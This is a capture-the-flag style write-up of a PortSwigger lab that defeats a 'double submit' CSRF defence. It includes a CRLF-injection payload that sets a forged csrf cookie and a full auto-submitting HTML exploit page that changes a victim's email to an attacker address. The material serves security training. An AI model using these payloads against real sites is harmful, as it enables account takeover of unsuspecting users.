# CSRF where token is duplicated in cookie

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie), you'll learn: CSRF where token is duplicated in cookie! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.

To solve the lab, use your exploit server to host an HTML page that uses a [CSRF attack](https://portswigger.net/web-security/csrf) to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-6/images/Pasted%20image%2020221215043750.png)

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-6/images/Pasted%20image%2020221215043838.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-6/images/Pasted%20image%2020221215043844.png)

In previous labs, we found that the email change functionality is **vulnerable to CSRF**, and also found **CRLF injection** vulnerability in home page's search post.

**Let's try to update our email, and intercept the request via Burp Suite:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-6/images/Pasted%20image%2020221215044220.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-6/images/Pasted%20image%2020221215044302.png)

**As you can see, our `csrf` cookie value is match to POST parameter `csrf` value!** This is so call the "double submit" defense against CSRF.

**Hmm... What if I change one of those `csrf` value?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-6/images/Pasted%20image%2020221215044519.png)

As expected, it outputs `Invalid CSRF token`.

**To bypass this protection, we can find something in website that changes or set a new cookie.**

**In home page, there is a `Search` button that allows users to search different blogs:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-6/images/Pasted%20image%2020221215044653.png)

**Let's intercept a request via Burp Suite's Repeater!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-6/images/Pasted%20image%2020221215044728.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-6/images/Pasted%20image%2020221215044754.png)

As you can see, it's sending a GET request to `/` with parameter `search`.

**Also, after sending that request, a new cookie value will be set: `LastSearchTerm=<search_parameter_value>`!**

**In the previous lab, we found that it's vulnerable to CRLF injection, which enables attacker to add a new cookie!**

**Payload:**
```
/?search=anything%0d%0aSet-Cookie:csrfKey=CRLF%3b%20SameSite=None
```

> Note: The `%3b%20` means `; `, and we need `SameSite` is set to `None`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-6/images/Pasted%20image%2020221215045030.png)

**That being said, we can forge a `csrf` cookie to the victim browser!**

**To do so, we can use the `exploit server`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-6/images/Pasted%20image%2020221215045143.png)

**Then, we can craft a HTTP form that performs CSRF attack, and send that exploit to the victim:**
```html
<html>
	<head>
		<title>CSRF-6</title>
	</head>
	<body>
		<form action="https://0ab3007f03fa8b1bc00a77b2008100dd.web-security-academy.net/my-account/change-email" method="POST">
		    <input type="hidden" name="email" value="attacker@evil.com">
		    <input type="hidden" name="csrf" value="5GaeDcsD8nJ2iTzyOGIcnydqApFgwUkK">
		</form>
		<img src="https://0ab3007f03fa8b1bc00a77b2008100dd.web-security-academy.net/?search=anything%0d%0aSet-Cookie:csrf=5GaeDcsD8nJ2iTzyOGIcnydqApFgwUkK%3b%20SameSite=None" onerror="document.forms[0].submit()">
	</body>
</html>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-6/images/Pasted%20image%2020221215045458.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-6/images/Pasted%20image%2020221215045507.png)

We successfully changed a victim's email address!

# What we've learned:

1. CSRF where token is duplicated in cookie